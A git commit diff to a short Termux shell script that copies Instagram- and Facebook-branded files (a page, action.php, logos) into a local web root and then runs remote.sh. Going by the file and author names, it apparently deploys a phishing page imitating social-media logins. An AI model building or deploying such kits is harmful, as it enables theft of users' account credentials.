4865abf49a054b8d4f57b43c639f28d23faad487
Philiphackerzx <65859306+Philiphackerzx@users.noreply.github.com>
2020-05-25 21:54:10 +0530

    Update asset3.sh

--- asset3.sh
+++ asset3.sh
@@ -1,11 +1,13 @@
 rm /sdcard/htdocs/index.php
 cd asset
 cd fcode
-cp facebook.ttf /sdcard/htdocs
+cp insta.ttf /sdcard/htdocs
 cp favicon.png /sdcard/htdocs
 cp index.php /sdcard/htdocs
-cp login.php /sdcard/htdocs
-cp mobile.png /sdcard/htdocs
+cp fb.png /sdcard/htdocs
+cp action.php /sdcard/htdocs
+cp arrow.png /sdcard/htdocs
+cp instagram.png /sdcard/htdocs
 cp style.css /sdcard/htdocs
 cd /data/data/com.termux/files/home/www.philiphacker.in/
 sh remote.sh
